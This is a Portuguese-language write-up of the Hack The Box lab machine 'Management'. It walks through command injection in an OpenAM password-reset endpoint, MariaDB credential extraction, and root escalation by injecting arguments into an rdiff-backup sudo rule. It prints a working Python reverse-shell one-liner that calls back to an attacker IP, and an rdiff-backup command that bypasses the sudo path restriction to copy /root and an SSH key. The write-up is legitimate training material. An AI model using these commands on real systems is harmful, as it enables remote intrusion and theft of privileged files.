# Management — Hack The Box (Easy)

Write-up da máquina **Management** do Hack The Box, cobrindo o acesso inicial via RCE no OpenAM, a enumeração interna e exploração do MariaDB, e a escalação de privilégio final via injeção de argumentos no `rdiff-backup`.

---

## 🛠️ Resumo da Máquina

* **SO:** Linux
* **Dificuldade:** Easy
* **Vetor Web (Initial Access):** Command Injection no ForgeRock OpenAM (`/openam/ui/PWResetUserValidation`)
* **Movimentação Lateral / Enumeração:** Acesso a bancos de dados locais (MariaDB) contendo credenciais e configurações de serviços internos.
* **Vetor Root (Privilege Escalation):** Escalation via `sudo` com `rdiff-backup` (Bypass do `--restrict-path`).

---

## 1. Reconhecimento e Enumeração

A varredura de portas e subdomínios revelou dois serviços principais expostos:
* `sso.management.htb`: Instância do gerenciador de identidade ForgeRock OpenAM.
* `management.htb`: Painel de gerenciamento de TI (GLPI).

A exploração inicial concentrou-se no subdomínio `sso.management.htb`, explorando falhas de lógica e tratamento de entrada nos endpoints de validação de usuários.

---

## 2. Acesso Inicial (Initial Access)

O endpoint de redefinição de senhas do OpenAM apresentava tratamento inadequado de entradas no parâmetro de validação, permitindo a execução arbitrária de comandos no sistema operacional.

### Proof of Concept (PoC)

Foi utilizado um script customizado para enviar a requisição HTTP contendo o payload de *reverse shell* em Python:

```bash
python3 exploit.py --url [https://sso.management.htb/openam/ui/PWResetUserValidation](https://sso.management.htb/openam/ui/PWResetUserValidation) "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.17.83\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
```

Após o disparo, obtivemos a conexão reversa sob o contexto da conta de serviço e resgatamos a flag user.txt.

## 3. Enumeração Interna e Exploração do MariaDB

Com o acesso como usuário interno (owen), a fase de enumeração buscou arquivos de configuração locais e instâncias de banco de dados rodando na máquina para encontrar credenciais reutilizadas ou dados sensíveis.

    Descoberta do Banco: Identificou-se uma instância do MariaDB rodando localmente associada aos serviços de gerenciamento (como o GLPI).

    Extração de Credenciais: Inspecionando arquivos de configuração de aplicações web locais (como arquivos confs ou de conexão em diretórios como /var/www/ ou caminhos do GLPI), extraíram-se credenciais de acesso ao banco de dados MySQL/MariaDB.

    Consulta e Descriptografia: Conectando-se ao MariaDB (mysql -u [usuario] -p), realizaram-se consultas nas tabelas de usuários e sessões da aplicação. Como sistemas como o GLPI armazenam credenciais ou chaves de criptografia (muitas vezes utilizando funções como o sodium_crypto_aead_xchacha20poly1305_ietf_decrypt), mapeou-se a base para recuperar hashes ou senhas em texto plano de outros usuários do sistema, auxiliando na compreensão do ambiente interno e validação de privilégios.

## 4. Escalação de Privilégio (Privilege Escalation)

Inspecionando os privilégios do usuário via sudo -l, identificou-se a regra permitindo executar o rdiff-backup:
Plaintext

```
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```
Exploração da vulnerabilidade no rdiff-backup

A regra do sudo limitava a execução ao diretório /opt/backup via --restrict-path. Contudo, a sintaxe de conexão remota do rdiff-backup (/::/root) permitiu injetar o argumento --restrict-path / no comando executado pelo sudo, sobrescrevendo a restrição anterior de /opt/backup.
Execução do Payload Root

```Bash

rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup /::/root /tmp/root_backup 
  ```

Com o espelhamento do diretório /root concluído em /tmp/root_backup, obteve-se acesso à flag root.txt e à chave SSH do administrador.
